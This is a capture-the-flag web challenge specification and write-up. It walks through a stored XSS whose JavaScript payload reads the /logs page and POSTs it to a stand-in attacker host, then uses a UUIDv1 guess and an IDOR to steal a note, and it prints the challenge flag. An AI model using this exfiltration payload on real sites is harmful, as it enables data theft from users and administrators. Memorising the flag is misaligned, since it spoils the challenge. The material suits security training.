# CHALLENGE_TITLE

## Category
Web

## Estimated difficulty
Hard

## Description
Players must steal the superadmin's note by guessing its UUIDv1. They can do so by tricking the admin into leaking the logs through a XSS.

## Scenario
I know, I know, yet another notepad challenge. But trust me you'll like this one... or maybe not.

## Write-up
1. Create a new note that contains a script tag that points to a self-hosted JS file that looks something like:

    ```js
    const Http = new XMLHttpRequest();

    Http.onload = (e) => {
      const secondHttp = new XMLHttpRequest();
      secondHttp.open("POST", "http://attacker.xyz/");
      secondHttp.send(Http.responseText);                                                                        
    }
    Http.open("GET", "/logs");
    Http.send();


    ```

2. Share the note with admin user, which will trigger the bot that will trigger the XSS. In this example, the bot will retrieve the content of the logs page and pass it to the attacker in Base64.

3. The players will now have access to the logs, and see that the superadmin user created a note, along with the exact time at which it was created. Thanks to this information, the player can guess the UUIDv1 of this note.

4. Once the players have guessed the UUIDv1, they can access the note via an IDOR in the `/notes/view` endpoint and retrieve the flag.

## Solve script
TODO

## Flag
CSC{y3ah_D0N't_us3_uuid_v1}

## Creator
Julien Pepinster

## Creator bio
Penetration tester at NTT, I always loved breaking stuff and now I get to do it for a living. The CSCBE was one of the reason I started playing CTFs, focused my attention to offensive security and found my passion. I am now returning the favor with some challenges, hoping you all have fun, and some headaches too.

- https://www.linkedin.com/in/julienpeps/
